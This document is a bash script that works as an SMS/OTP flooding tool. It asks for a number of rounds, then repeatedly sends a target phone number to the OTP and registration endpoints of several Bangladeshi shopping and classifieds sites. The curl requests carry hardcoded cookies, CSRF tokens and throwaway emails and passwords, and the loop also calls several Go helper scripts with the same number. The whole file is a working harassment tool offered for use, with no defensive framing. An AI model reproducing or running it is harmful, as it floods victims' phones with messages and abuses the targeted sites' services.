

#!/usr/bin/env bash

read -p "put the number of round you want to send:>> " num
go run babe2.go -number $1

for (( i = 0; i < $num; i++ )); do

curl https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$1


curl -i -s -k -X $'POST' \
    -H $'Host: www.nrbbazaar.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 232' -H $'Origin: https://www.nrbbazaar.com' -H $'Referer: https://www.nrbbazaar.com/register?returnUrl=%2F' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' \
    -b $'AWSALB=XKdMxKNsP1gzLOUUKc0N9Z+Txstw4J8msQBo1EYUHJkuAAuycD5BtKc26hHkqJ2ZHsRS+RRxbqEpm9y/59Mm1I+IwlidX5EcEfOX1V4/f33Zlzve83LTTqrX0Vun; AWSALBCORS=XKdMxKNsP1gzLOUUKc0N9Z+Txstw4J8msQBo1EYUHJkuAAuycD5BtKc26hHkqJ2ZHsRS+RRxbqEpm9y/59Mm1I+IwlidX5EcEfOX1V4/f33Zlzve83LTTqrX0Vun; .Nop.Antiforgery=CfDJ8LnbIVa1j9lCq5yfnZqfbW49WPgilwjwWPl_RcGggulw2QLDwEvUCDmYcU0YLN5YVMXc_mzyMp3ha8hEDRkva4a5Ur9ZUFWPCBRe-vPRz-clBEGI-vWXnG47ph0MJuV-3Usesxf1AzqiIbY5FOq6XxE; .Nop.Customer=33782970-24ba-4b8c-89cc-b2927cdac6c9; .Nop.Culture=c%3Den-US%7Cuic%3Den-US' \
    --data-binary $"phoneNumber=$1&email=tes56789t@gmail.com&__RequestVerificationToken=CfDJ8LnbIVa1j9lCq5yfnZqfbW5ACenNIV9UPVsXp4kSHNsY7QA4imAndZijDtHinB6MOwvFilITCxouvFwY92389E7ordMghTo7F5md2TJ4TkwrOdu_be_6w_JxvmbLAjAMYVL0hBINUwzr_QXqfAsGQQU" \
    $'https://www.nrbbazaar.com/Customer/RequestOtpForRegistration'


curl -i -s -k -X $'POST' \
    -H $'Host: www.shopz.com.bd' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 311' -H $'Origin: https://www.shopz.com.bd' -H $'Referer: https://www.shopz.com.bd/my-account/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' \
    --data-binary $"g-web-reg-phone-cc=%2B88&g-web-reg-phone=$1&g-web-form-token=5504&g-web-csrf=4117a7a&g-web-form-type=register_user&email=teiykgfl%40hgf.com&password=C%7D%5EeaF%25*%3AD7W_W*&woocommerce-register-nonce=aaa253a8eb&_wp_http_referer=%2Fmy-account%2F&action=g_web_phone_register_form_submit&register=Register" \
    $'https://www.shopz.com.bd/wp-admin/admin-ajax.php'


go run main.go -phone $1 -c 3
go run babe.go -phone $1
go run babe1.go -number $1
go run babe3.go -number $1



    



done




 